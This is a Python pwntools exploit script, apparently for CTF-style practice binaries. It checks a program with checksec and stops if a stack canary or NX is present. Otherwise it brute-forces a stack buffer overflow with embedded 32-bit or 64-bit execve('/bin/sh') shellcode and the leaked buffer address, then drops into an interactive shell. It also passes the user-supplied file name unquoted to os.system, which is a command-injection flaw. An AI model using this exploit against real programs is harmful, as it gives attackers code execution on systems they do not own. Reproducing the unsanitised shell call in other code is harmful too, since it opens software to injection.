import sys
from pwn import*

def bit32_exploit(binary_name):

    shellcode_32bit = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' # 25bit
    i = 1

    while i < 10000:

        context.log_level = 'debug'
        print("roop " , i )
        p = process('./'+binary_name)
        p.recvuntil('buf : ')
        addr = int(p.recv(10),16)

        payload = shellcode_32bit
        payload += 'A'*i
        payload += 'B'*4
        payload += p32(addr)
        p.sendline(payload)
        sleep(0.1)
        
        try:
            p.sendline('ls >> output2.txt')
        
        except:
            i += 1
        else:
            p.interactive()
            break

def bit64_exploit(binary_name):

    shellcode_64bit = '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05' #23bit
    i = 1

    while i < 10000:

        context.log_level = 'debug'
        print("roop " , i )
        p = process('./'+binary_name)
        p.recvuntil('buf : ')
        addr = int(p.recv(14),16)

        payload = shellcode_64bit
        payload += 'A'*i
        payload += 'B'*8
        payload += p64(addr)
        p.sendline(payload)
        sleep(0.1)
        
        try:
            p.sendline('ls >> output2.txt')
        
        except:
            i += 1
        else:
            p.interactive()
            break



memory_protects = ['Canary found', 'NX enabled']
bit = 0

binary_name = raw_input('binary name : ').rstrip('\n')
binary_data = int(input('32 biyt or 64 bit : '))

print("[+] Checking Banary....")
os.system('checksec ' + binary_name + ' 2> output.txt')

f = open('output.txt','r')
lines = f.readlines()

f.close()

for line in lines:
    print(line)

for memory_protect in memory_protects:
    for line in lines:
        if memory_protect in line:
            print("[-] "+ memory_protect + "....")
            bit = 1

if bit == 1:
    sys.exit()

print("[+] not Binary protection")
print("[+] ok....")

if binary_data == 32:
    bit32_exploit(binary_name)

else:
    bit64_exploit(binary_name)
